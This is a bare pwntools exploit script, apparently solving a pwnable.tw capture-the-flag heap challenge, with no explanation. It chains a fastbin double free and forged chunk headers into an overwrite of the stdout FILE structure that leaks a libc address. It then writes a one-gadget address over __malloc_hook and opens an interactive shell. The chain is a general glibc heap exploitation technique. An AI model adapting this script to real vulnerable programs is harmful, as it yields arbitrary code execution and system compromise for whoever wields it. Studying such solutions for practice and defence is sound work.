from pwn import *
io = process("./back",env={"LD_PRELOAD":"./libc_64.so.6"})
#io = remote("chall.pwnable.tw",10308)

def add(arg1,arg2):
    io.recvuntil("You Choice:")
    io.sendline("1")
    io.recvuntil("Size :")
    io.sendline(str(arg1))
    io.recvuntil("Data :")
    io.send(arg2)

def delete(arg1):
    io.recvuntil("You Choice:")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(arg1))

payload = p64(0)*10 + p64(0) + p64(0x71)

add(0x60,payload)
add(0x60,"bbbbbbbb")
delete(0)
delete(1)
delete(0)
add(0x60,"\x60")
add(0x60,payload)
add(0x60,"dddddddd")
add(0x60,"eeeeeeee")
payload = p64(0)*3 + p64(0x41)
add(0x50,payload)
delete(3)        # in both bins
delete(5)        # fake
add(0x60,(p64(0)+p64(0x91)))
delete(3)
delete(5)
payload = p64(0)+p64(0x71) + "\xdd\x95"
add(0x60,payload)
add(0x60,"11111111")
payload = "a"*3 + p64(0) * 6 +p64(0x00000000fbad3887) + p64(0)*3 + "\x60"
gdb.attach(io)
add(0x60,payload)
leak = u64(io.recv(6) + "\x00\x00") - 0x3c46a4
hook = leak +  0x3c3aed

print(str(hex(leak)))
delete(3)
delete(5)
one = leak+0xf0567

payload = p64(0) + p64(0x71)+ p64(hook)
add(0x60,payload)
add(0x60,"abcdefgh")
payload = "a"*3 + p64(0) * 2 +p64(one)
add(0x60,payload)
io.interactive()
